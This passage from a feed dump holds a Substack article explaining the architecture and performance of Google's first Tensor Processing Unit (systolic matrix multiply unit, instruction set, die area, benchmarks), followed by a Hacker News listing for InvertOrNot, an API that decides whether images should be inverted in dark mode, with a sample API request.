src="https://substackcdn.com/image/fetch/w_1300,h_650,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png" sizes="100vw" alt="Google's First Tensor Processing Unit : Origins" srcset="https://substackcdn.com/image/fetch/w_424,h_212,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 424w, https://substackcdn.com/image/fetch/w_848,h_424,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 848w, https://substackcdn.com/image/fetch/w_1272,h_636,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1272w, https://substackcdn.com/image/fetch/w_1300,h_650,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1300w" width="1300" height="650"></picture></a></div></div><p>Today’s post will look in more detail at the architecture that emerged from that work and at its performance.</p><p data-attrs="{&quot;url&quot;:&quot;https://thechipletter.substack.com/p/googles-first-tpu-architecture?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://thechipletter.substack.com/p/googles-first-tpu-architecture?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p>A quick reminder of the objectives of the TPU v1 project. As Google saw not only the opportunities provided by a new range of services using Deep Learning but also the huge scale and the cost of the hardware that would be needed to power these services, the aims of the project would be …&nbsp;</p><blockquote><p>… to develop an Application Specific Integrated Circuit (ASIC) that would generate a 10x cost-performance advantage on inference when compared to GPUs.</p></blockquote><p>and to …&nbsp;</p><blockquote><p><span>Build it quickly</span><br><span>Achieve high performance</span><br><span>......at scale</span><br><span>...for new workloads out-of-the-box...</span><br><span>all while being cost-effective</span></p></blockquote><p>Before we look at the TPU v1 that emerged from the project in more detail, a brief reminder of the Tensor operations that give the TPU its name.</p><blockquote><p>Why is a Tensor Processing Unit so called? Because it is designed to speed up operations involving tensors. Precisely, what operations though? The operations are referred to … as a “map (multilinear relationship) between different objects such as vectors, scalars, and even other tensors”.</p><p>Let’s take a simple example. A two-dimensional array can describe a multilinear relationship between two one-dimensional arrays. The mathematically inclined will recognize the process of getting from one vector to the other as multiplying a vector by a matrix to get another vector.</p><p>This can be generalized to tensors representing the relationship between higher dimensional arrays. However, although tensors describe the relationship between arbitrary higher-dimensional arrays, in practice the TPU hardware that we will consider is designed to perform calculations associated with one and two-dimensional arrays. Or, more specifically, vector and matrix operations.</p></blockquote><p>Let’s look at one of these operations, matrix multiplication. If we take two 2x2 matrices (2x2 arrays) then we multiply them together to get another 2x2 matrix by multiplying the elements as follows.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png" width="1350" height="262" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:262,&quot;width&quot;:1350,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f62b15d-8198-4c20-90f4-ebbad9203299_1350x262.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Why are matrix multiplications key to the operation of neural networks? We can look at a simple neural network with four layers as follows (only the connections from the first node in each later layer are shown for simplicity):&nbsp;</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg" width="1456" height="1165" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1165,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:120924,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F51407b73-27d7-42ba-ad4d-043f25b7633d_1580x1264.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Where ‘f’ here is the </span><a href="https://en.wikipedia.org/wiki/Activation_function" rel="">activation function</a><span>.</span></p><p>So the hidden and output layers are the results of applying the activation function to each element of the vector which is the result of multiplying the vector of input values times the matrix of weights. With a number of data inputs this is equivalent to applying the activation function to each entry in a matrix that is the result of a matrix multiplication.</p><p><span>As we’ve seen, the approach adopted by the TPU v1 team was an architecture first set out by H.T Kung and Charles E. Leiserson in their 1978 paper </span><a href="https://www.eecs.harvard.edu/htk/static/files/1978-cmu-cs-report-kung-leiserson.pdf" rel="">Systolic Arrays (for VLSI)</a><span>.</span></p><blockquote><p>A systolic system is a network of processors which rhythmically compute and pass data through the system….In a systolic computer system, the function of a processor is analogous to that of the heart. Every processor regularly pumps data in and out, each time performing some short computation so that a regular flow of data is kept up in the network.</p></blockquote><p>So how is the systolic approach used in the TPU v1 to efficiently perform matrix multiplications? Let’s return to our 2x2 matrix multiplication example.</p><p>If we have a 2x2 array of multiplication units that are connected in a simple grid, and we feed the elements of the matrices that we are multiplying, into the grid in the right order then the results of the matrix multiplication will naturally emerge from the array.</p><p>The calculation can be represented in the following diagram. The squares in each corner represent a multiply / accumulate unit (MAC) that can perform a multiplication and addition operation.</p><p>In this diagram, the values in yellow are the inputs that are fed into the matrix from the top and the left. The light blue values are the partial sums that are stored. The dark blue values are the final results</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg" width="1456" height="1556" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1556,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:217775,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>.Let’s take it step by step.</p><blockquote><p><em>Step 1:</em></p><p>Values a11 and b11 are loaded into the top left multiply/accumulate unit (MAC). They are multiplied together and the result is stored.</p><p><em>Step 2:</em></p><p>Values a12 and b21 are loaded into the top left MAC. They are multiplied together and added to the previously calculated result. This gives the top left value of the results matrix.</p><p>Meanwhile, b11 is transferred to the top right MAC where it is multiplied by the newly loaded value a21 and the result is stored. Also, a11 is transferred to the bottom left MAC where it is multiplied by the newly loaded value b12, and the result is stored.</p><p><em>Step 3:</em></p><p>b21 is transferred to the top right MAC where it is multiplied by the newly loaded value a22 and the result is added to the previously stored result. Also, a12 is transferred to the bottom left MAC where it is multiplied by the newly loaded value b22, and the result is added to the previously stored result. In this step, we have calculated the top right and bottom left values of the results matrix.</p><p>Meanwhile, a12 and b21 are transferred to the bottom right MAC where they are multiplied and the result is stored.</p><p><em>Step 4:&nbsp;</em></p><p>Finally, a22 and b22 are transferred to the bottom right MAC where they are multiplied and the result is added to the previously stored value giving the bottom right value of the results matrix.</p><p>So the results of the matrix multiplication emerge down a moving ‘diagonal’ in the matrix of MACs.&nbsp;</p></blockquote><p>In our example, it takes 4 steps to do a 2 x 2 matrix multiplication, but only because some of the MACs are not utilized at the start and end of the calculation. In practice, a new matrix multiplication would start top left as soon as the MAC is free. As a result the unit is capable of a new matrix multiplication every two cycles.</p><p>This is a simplified representation of how a systolic array works and we’ve glossed over some of the details of the implementation of the systolic array in TPU v1. I hope that the principles of how this architecture works are clear though.</p><p>This is the simplest possible matrix multiplication but can be extended to bigger matrices with larger arrays of multiplication units.</p><p>The key point is that if data is fed into the systolic array in the right order then the flow of values and results through the system will ensure that the required results emerge from the array over time.</p><p>Crucially there is no need to store and fetch intermediate results from a ‘main memory’ area. Intermediate results are automatically available when needed due to the structure of the matrix multiply unit and the order in which inputs are fed into the unit.</p><p>Of course, the matrix multiply unit does not sit in isolation and the simplest presentation of the complete system is as follows:</p><p><span>The first thing to note is that TPUv1 relies on communication with the host computer over a </span><a href="https://en.wikipedia.org/wiki/PCI_Express" rel="">PCIe</a><span> (high speed serial bus) interface. It also has direct access to its own DDR3 Dynamic RAM storage.</span></p><p>We can expand this to a more detailed presentation of the design:</p><p>Let’s pick some key elements from this presentation of the design, starting at the top and moving (broadly) clockwise:</p><ul><li><p><strong>DDR3 DRAM / Weight FIFO:</strong><span> Weights are stored in DDR3 RAM chips connected to the TPU v1 via DDR3-2133 interfaces. Weights are ‘pre-loaded’ onto these chips from the host computer’s memory via PCIe and can then be transferred into the ‘Weight FIFO’ memory ready for use by the matrix multiply unit.</span></p></li><li><p><strong>Matrix Multiply Unit: </strong><span>This is a ‘systolic’ array with 256 x 256 matrix multiply/accumulate units that is fed by 256 ‘weight’ values from the top and 256 data inputs from the left.</span></p></li><li><p><strong>Accumulators:</strong><span> The results emerge from the systolic matrix unit at the bottom and are stored in ‘accumulator’ memory storage.</span></p></li><li><p><strong>Activation: </strong><span>The activation functions described in the neural network above are applied here.</span></p></li><li><p><strong>Unified Buffer / Systolic Data Setup: </strong><span>The results of applying the activation functions are stored in a ‘unified buffer’ memory where they are ready to be fed back as inputs to the Matrix Multiply Unit to calculate the values needed for the next layer.</span></p></li></ul><p>So far we haven’t specified the nature of the multiplications performed by the matrix multiply unit. TPU v1 performs 8-bit x 8-bit integer multiplications, making use of quantization to avoid the need for more die-area-hungry floating-point calculations.</p><p>The TPU v1 uses a CISC (Complex Instruction Set Computer) design with around only about 20 instructions. It’s important to note that these instructions are sent to it by the host computer over the PCIe interface, rather than being fetched from memory.</p><p>The five key instructions are as follows:</p><p><em><strong>Read_Host_Memory</strong></em></p><p>Reads input values from the host computer’s memory into the Unified Buffer over PCIe.</p><p><em><strong>Read_Weights</strong></em></p><p>Read weights from the weight memory into the Weight FIFO. Note that the weight memory will already have been loaded with weights read from the computer’s main memory over PCIe.</p><p><em><strong>Matrix_Multiply / Convolve</strong></em></p><p>From the paper this instruction</p><blockquote><p>… causes the Matrix Unit to perform a matrix multiply or a convolution from the Unified Buffer into the Accumulators. A matrix operation takes a variable-sized B*256 input, multiplies it by a 256x256 constant weight input, and produces a B*256 output, taking B pipelined cycles to complete.</p></blockquote><p>This is the instruction that implements the systolic array matrix multiply. It can also perform convolution calculations needed for Convolutional Neural Networks.</p><p><em><strong>Activate</strong></em></p><p>From the paper this instruction</p><blockquote><p>Performs the nonlinear function of the artificial neuron, with options for ReLU, Sigmoid, and so on. Its inputs are the Accumulators, and its output is the Unified Buffer.</p></blockquote><p><span>If we go back to our simple neural network model the values in the hidden layers are the result of applying an ‘activation function’ to the sum of the weights multiplied by the inputs. </span><a href="https://en.wikipedia.org/wiki/Rectifier_(neural_networks)" rel="">ReLU</a><span> and </span><a href="https://en.wikipedia.org/wiki/Sigmoid_function" rel="">Sigmoid</a><span> are two of the most popular activation functions. Having these implemented in hardware will have provided a useful speed-up in the application of the activation functions.</span></p><p><em><strong>Write_Host_Memory</strong></em></p><p>Writes results to the host computer’s memory from the Unified Buffer over PCIe.</p><p>It’s probably worth pausing for a moment to reflect on the elegance of these five instructions in providing an almost complete implementation of inference in the TPU v1. In pseudo-code, we could describe the operation of the TPU v1 broadly as follows:</p><pre><code>Read_Host_Memory
Read_Weights
Loop_Start
    Matrix_Multiply
    Activate
Loop_End
Write_Host_Memory</code></pre><p>It’s also useful to emphasize the importance of the systolic unit in making this possible and efficient. As described by the TPU v1 team (and as we’ve already seen):</p><blockquote><p>.. the matrix unit uses systolic execution to save energy by reducing reads and writes of the Unified Buffer …. It relies on data from different directions arriving at cells in an array at regular intervals where they are combined. … data flows in from the left, and the weights are loaded from the top. A given 256-element multiply-accumulate operation moves through the matrix as a diagonal wavefront.</p></blockquote><p>The TPU v1’s hardware would be of little use without a software stack to support it. Google developed and used Tensorflow so creating ‘drivers’ so that Tensorflow could work with the TPU v1 was the main step needed.&nbsp;</p><blockquote><p>The TPU software stack had to be compatible with those developed for CPUs and GPUs so that applications could be ported quickly to the TPU. The portion of the application run on the TPU is typically written in TensorFlow and is compiled into an API that can run on GPUs or TPUs.</p><p>Like GPUs, the TPU stack is split into a User Space Driver and a Kernel Driver. The Kernel Driver is lightweight and handles only memory management and interrupts. It is designed for long-term stability. The User Space driver changes frequently. It sets up and controls TPU execution, reformats data into TPU order, translates API calls into TPU instructions, and turns them into an application binary.</p></blockquote><p>As we saw in our earlier post, the TPU v1 was fabricated by TSMC using a relatively ‘mature’ 28nm TSMC process. Google has said that the die area is less than half the die area of the Intel Haswell CPU and Nvidia’s K80 GPU chips, each of which was built with more advanced processes, that Google was using in its data centers at this time.&nbsp;</p><p>We have already seen how simple the TPU v1’s instruction set was, with just 20 CISC instructions. The simplicity of the ISA leads to a very low ‘overhead’ in the TPU v1’s die for decoding and related activities with just 2% of the die area dedicated to what are labeled as ‘control’.</p><p>By contrast, 24% of the die area is dedicated to the Matrix Multiply Unit and 29% to the ‘Unified Buffer’ memory that stores inputs and intermediate results.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg" width="792" height="820" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:820,&quot;width&quot;:792,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:188413,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>At this point, it’s useful to remind ourselves that the TPU v1 was designed to make inference - that is the use of already trained models in real-world services provided at Google’s scale - more efficient. It was not designed to improve the speed or efficiency of training. Although they have some features in common inference and training provide quite different challenges when developing specialized hardware.</p><p>So how did the TPU v1 do?</p><p>In 2013 the key comparisons for the TPU v1 were with Intel’s Haswell CPU and Nvidia’s K80 GPU.</p><ul><li><p>TPU v1 has 25 times as many MACs and 3.5 times as much on-chip memory as the K80 GPU.</p></li><li><p>The TPU v1 is about 15X - 30X faster at inference than the K80 GPU and the Haswell CPU.</p></li></ul><p>And crucially the TPU v1 was much more energy efficient that GPUs:</p><ul><li><p>The relative incremental-performance/Watt of the TPU v1 is to 25 to 29 times that of the GPU.</p></li></ul><p>In the first post on the TPU v1, we focused on the fact that an organization like Google could marshal the resources to build the TPU v1 quickly.</p><p>In this post we’ve seen how the custom architecture of the TPU v1 was crucial in enabling it to generate much better performance with much lower energy use than contemporary CPUs and GPUs.</p><p>The TPU v1 was only the start of the story. TPU v1 was designed quickly and with the sole objective of making inference faster and more power efficient. It had a number of clear limitations and was not designed for training.  Both inside and outside Google firms would soon start to look at how TPU v1 could be improved. We’ll look at some of its successors in later posts.</p><p>After the paywall, a small selection of further reading and viewing on Google’s TPU v1.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Invertornot.com – API to enhance your images in dark-mode (161 pts)]]></title>
            <link>https://invertornot.com</link>
            <guid>39821632</guid>
            <pubDate>Mon, 25 Mar 2024 21:49:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://invertornot.com">https://invertornot.com</a>, See on <a href="https://news.ycombinator.com/item?id=39821632">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
        <p>
            Make your app's dark-mode smarter with InvertOrNot. Our API predicts if an image should be inverted for
            optimal
            dark-mode rendering. <br>
            This API is free, and is open source (both the code and the weights of the model are <a href="https://github.com/mattismegevand/invertornot">available</a>).
        </p>

        <p><img src="https://invertornot.com/static/examples.png" width="100%" alt="Example of outputs"></p><h4>Try it out</h4>
        <p>Upload an image to see InvertOrNot what transformation it would apply to it.</p>
        

        <h4>Background</h4>
        <p>
            Despite dark-mode's popularity, images often aren't automatically adapted to fit it.
            The conservative approach is to reduce the brightness of the image, which can degrade it significantly.
            Inverting the image can be a better solution, but it can't be applied to all images (see the poor Queen
            Victoria).<br>
            Using our API you can make your website more pleasant to use in dark-mode, without having to manually adapt
            each image.
        </p>

        <h4>How does it work?</h4>
        <p>The API works by finetuning an <a href="https://arxiv.org/abs/1905.11946">EfficientNet</a> model on a custom
            dataset using PyTorch. By using deep learning we are able to
            have a
            much more reliable approach to solve this problem, the only alternative being heuristics.</p>

        <h4>How can I use it?</h4><p>
        Documentation is available <a href="https://invertornot.com/docs/">here</a>. If possible cache or store the results provided by the API
        to avoid unnecessary calls.
        </p><table>
            <thead>
                <tr>
                    <th>Endpoint</th>
                    <th>Method</th>
                    <th>Input</th>
                    <th>Output</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><code>/api/file</code></td>
                    <td><code>POST</code></td>
                    <td>List of image files</td>
                    <td>List of <code>{invert, sha1, error}</code> for each file.</td>
                </tr>
                <tr>
                    <td><code>/api/url</code></td>
                    <td><code>POST</code></td>
                    <td>List of image URLs</td>
                    <td>List of <code>{invert, sha1, error, url}</code> for each URL.</td>
                </tr>
                <tr>
                    <td><code>/api/sha1</code></td>
                    <td><code>POST</code></td>
                    <td>List of SHA-1 hashes</td>
                    <td>List of <code>{invert, sha1, error}</code> for each SHA-1.</td>
                </tr>
            </tbody>
        </table>

        <p>
        Example of a request:
        </p><pre>            <code>
                curl -X 'POST' \
                  'https://invertornot.com/api/url' \
                  -H 'accept: application/json' \
                  -H 'Content-Type: application/json' \
                  -d '[
                  "https://upload.wikimedia.org/wikipedia/commons/e/e3/Queen_Victoria_by_Bassano.jpg"
                ]'
            </code>
        </pre><p>
        Response:
        </p><pre>            <code>
                [
                  {
                    "invert": 0,
                    "sha1": "da487e2e9855362b4a5f4fdb531c55ae47ac6e1b",
                    "error": "",
                    "url": "https://upload.wikimedia.org/wikipedia/commons/e/e3/Queen_Victoria_by_Bassano.jpg"
                  }
                ]
            </code>
        </pre><p>

        If you've never adapted images for dark-mode, here's a quick example of what the CSS can look like:
